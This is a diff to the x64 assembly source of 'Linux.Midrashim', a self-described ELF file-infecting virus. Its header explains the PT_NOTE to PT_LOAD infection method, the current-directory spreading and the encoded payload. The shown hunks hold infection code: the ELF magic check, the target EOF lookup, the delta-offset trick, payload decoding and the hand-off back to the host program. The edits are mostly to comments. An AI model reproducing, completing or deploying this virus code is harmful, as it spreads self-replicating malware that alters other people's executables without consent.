@@ -1,13 +1,15 @@
 ; Linux.Midrashim
 ; Written by TMZ
+;
 ; Finished on 30.05.2020
 ; Released on 07.11.2020
 ; The release was delayed because I was trying to code a fancy 90's style payload and due to lack of time, I'll leave this to another project.
-; This is my first full assembly virus and it uses FASM (https://flatassembler.net).
-;   - relies on PT_NOTE -> PT_LOAD infection technique and should work on any 64bit ELF executable (position independent or not).
-;   - should use mmap but instead it uses pread and pwrite (I'm lazy). 
+; This is my first full assembly virus and should be assembled with FASM x64.
+;   - relies on PT_NOTE -> PT_LOAD infection technique and should work on regular x64 ELF executables (position independent or not).
+;   - should use mmap but instead it uses pread and pwrite (due to lazyness). 
 ;   - stores stuff on memory buffer (r15 register).
 ;   - infects current directory (non recursively).
+;
 ; Payload (non destructive) is a quote from a song and it's encoded for no reason whatsoever.
 ; 
 ; A big thanks for those who keeps the VX scene alive!
@@ -38,6 +40,7 @@ SYS_LSEEK       = 8
 SYS_PREAD64     = 17
 SYS_PWRITE64    = 18
 SYS_SYNC        = 162
+STDOUT          = 1
 EHDR_SIZE       = 64
 ELFCLASS64      = 2
 O_RDONLY        = 0
@@ -137,7 +140,7 @@ v_start:
             syscall
 
         .is_elf:
-            cmp dword [r15 + 144], 0x464c457f                   ; 0x464c457f means .ELF (dword, little-endian)
+            cmp dword [r15 + 144], 0x464c457f                   ; 0x464c457f means .ELF (little-endian)
             jnz .close_file                                     ; not an ELF binary, close and continue to next file if any
         
         .is_64:
@@ -193,7 +196,7 @@ v_start:
                 syscall                                         ; getting target EOF offset in rax
                 push rax                                        ; saving target EOF
 
-                call .delta
+                call .delta                                     ; the age old trick
                 .delta:
                     pop rbp
                     sub rbp, .delta
@@ -492,7 +495,7 @@ v_start:
         len = $-msg
 
     payload:
-        pop rsi
+        pop rsi                                                 ; setting up decoding loop
         mov rcx, len
         lea rdi, [r15 + 3000]
 
@@ -505,15 +508,16 @@ v_start:
 
         lea rsi, [r15 + 3000]                                   ; decoded payload is at [r15 + 3000]
         mov rax, SYS_WRITE
-        mov rdi, 1                                              ; write payload to STDOUT
+        mov rdi, STDOUT                                         ; display payload
         mov rdx, len
         syscall
     
-    add rsp, 5008                                               ; restoring stack so host process can run normally
+    add rsp, 5008                                               ; restoring stack so host process can run normally, this could use some improvement
     pop rsp
     pop rdx
+
 v_stop:
-    ; virus body stop (host program start)
+    ; virus body end (host program start)
     xor rdi, rdi                                                ; exit code 0
     mov rax, SYS_EXIT
     syscall
